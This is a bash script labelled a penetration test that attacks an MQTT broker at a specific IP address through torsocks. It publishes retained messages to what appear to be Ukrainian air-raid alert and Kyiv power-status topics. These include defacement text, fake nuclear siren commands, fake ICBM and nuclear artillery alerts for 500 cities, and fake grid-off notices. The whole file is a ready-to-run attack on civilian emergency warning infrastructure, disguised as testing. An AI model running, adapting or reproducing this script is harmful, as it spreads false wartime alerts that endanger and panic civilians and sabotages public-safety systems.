#!/bin/bash
# TRUSTEDF57 TOTAL CAOS v8.0 - COMPLETE PENETRATION TEST
BROKER="212.26.132.229"
PORT="1883"
DEFACE="TRUSTEDF57 GOVERNA MI FOTTO MARTHA ROOT"
HITS=0
TOTAL_TARGETS=2000

echo "TRUSTEDF57 PENETRATION TEST v8.0"
echo "Target: $BROKER:$PORT"

pkill -f torsocks 2>/dev/null
sleep 1

echo "PHASE 1/4: DEFACE MESSAGES"
for i in {1..500}; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/status" -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/message" -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/alert" -m "$DEFACE" -r -q 2 >/dev/null 2>&1
    HITS=$((HITS+3))
done
echo "DEFACE: 1500 hits"

echo "PHASE 2/4: SIRENE NUCLEAR"
for i in {1..500}; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/siren" -m '{"status":1,"sound":"nuclear","volume":100,"duration":999999,"f57":"active"}' -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/sound" -m '{"type":"nuclear","loop":true,"priority":999}' -r -q 2 >/dev/null 2>&1
    HITS=$((HITS+2))
done
echo "SIRENE: 1000 hits"

echo "PHASE 3/4: MISSILI NUCLEAR"
for i in {1..500}; do
    CITY_ID=$(printf "C%03d" $i)
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/NUCLEAR" -m "{\"status\":1,\"type\":\"ICBM\",\"target\":\"$CITY_ID\",\"impact\":\"90s\",\"count\":50}" -r -q 2 >/dev/null 2>&1
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/${i}/ARTILLERY" -m "{\"status\":1,\"type\":\"NUCLEAR_ARTILLERY\",\"count\":100}" -r -q 2 >/dev/null 2>&1
    HITS=$((HITS+2))
done
echo "NUCLEAR: 1000 hits"

echo "PHASE 4/4: TOTAL BLACKOUT"
POWER_TOPICS=(
    "power/yasno_kyiv/status"
    "power/kyiv_groups/1.1"
    "power/yasno_kyiv/json/OFF/1.1"
    "power/kyiv_digital/groups/1.1"
    "power/yasno_kyiv/groups/3.1"
    "power/emergency"
    "power/ukraine_all/status"
    "power/kyiv_power/0"
    "power/national_grid/off"
    "power/yasno_kyiv/emergency"
)

for topic in "${POWER_TOPICS[@]}"; do
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "$topic" -m "{\"status\":0,\"power\":\"OFF\",\"reason\":\"F57_BLACKOUT\"}" -r -q 2 >/dev/null 2>&1
    HITS=$((HITS+1))
done
echo "BLACKOUT: 10 hits"

echo "FINAL: CENTRAL OVERRIDE"
torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_central" -m "$DEFACE" -r -q 2 >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "emergency/all_cities" -m "{\"nuclear\":true,\"sirens\":true,\"power\":0}" -r -q 2 >/dev/null 2>&1
HITS=$((HITS+2))

echo ""
echo "COMPLETE - TOTAL HITS: $HITS"
echo "VERIFICATION:"
echo "torsocks mosquitto_sub -h $BROKER -p $PORT -t 'ukrainealarm_persistent/+/status' -v | head -5"
